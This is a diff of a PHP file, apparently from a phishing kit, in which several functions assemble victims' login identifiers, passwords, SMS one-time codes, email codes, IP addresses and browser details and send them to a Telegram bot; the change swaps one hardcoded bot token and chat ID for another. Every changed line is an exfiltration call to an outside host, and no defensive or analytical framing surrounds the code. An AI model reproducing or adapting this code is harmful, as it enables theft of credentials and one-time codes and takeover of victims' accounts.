@@ -176,7 +176,7 @@
 					$text .= "|SYSTEME    :  " .AntiBomb_OS($referer)."\n";
 					$text .= "|BROWSER    :  " .$referer."\n";
 					$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
-					file_get_contents("https://api.telegram.org/bot5149882225:AAEqOdBKli6ks1xA4rdZ8SXPUfueuwtYWfU/sendMessage?chat_id=-1001722082206&text=" . urlencode($text)."" );
+					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=-730481895&text=" . urlencode($text)."" );
 	}
 
 	function AntiBombResII($identifiant,$password, $user, $referer, $text = null){
@@ -186,7 +186,7 @@
 							$text .= "|SYSTEME    :  " .AntiBomb_OS($referer)."\n";
 							$text .= "|BROWSER    :  " .$referer."\n";
 							$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
-					file_get_contents("https://api.telegram.org/bot5149882225:AAEqOdBKli6ks1xA4rdZ8SXPUfueuwtYWfU/sendMessage?chat_id=-1001722082206&text=" . urlencode($text)."" );
+					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=-730481895&text=" . urlencode($text)."" );
 	}
 
 	function AntiBombResOTP($otp, $user, $referer, $text = null){
@@ -197,7 +197,7 @@
 					$text .= "|BROWSER    :  " .$referer."\n";
 					$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
 					$text .= "|====================[ Code sms ]=========================|\n";
-					file_get_contents("https://api.telegram.org/bot5149882225:AAEqOdBKli6ks1xA4rdZ8SXPUfueuwtYWfU/sendMessage?chat_id=-1001722082206&text=" . urlencode($text)."" );
+					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=-730481895&text=" . urlencode($text)."" );
 	}
 	function AntiBombResOtpEmail($otpmail, $user, $referer, $text = null){
 					$text  = "|====================[ code email ]=========================|\n";
@@ -208,7 +208,7 @@
 					$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
 					$text .= "|====================[ Code email ]=========================|\n";
 
-					file_get_contents("https://api.telegram.org/bot5149882225:AAEqOdBKli6ks1xA4rdZ8SXPUfueuwtYWfU/sendMessage?chat_id=-1001722082206&text=" . urlencode($text)."" );
+					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=-730481895&text=" . urlencode($text)."" );
 	}
 	function AntiBombResInfo($ttx,$ctx,$dtx,$cttx, $user, $referer, $text = null){
 					$text  = "|====================[  info ]=========================|\n";
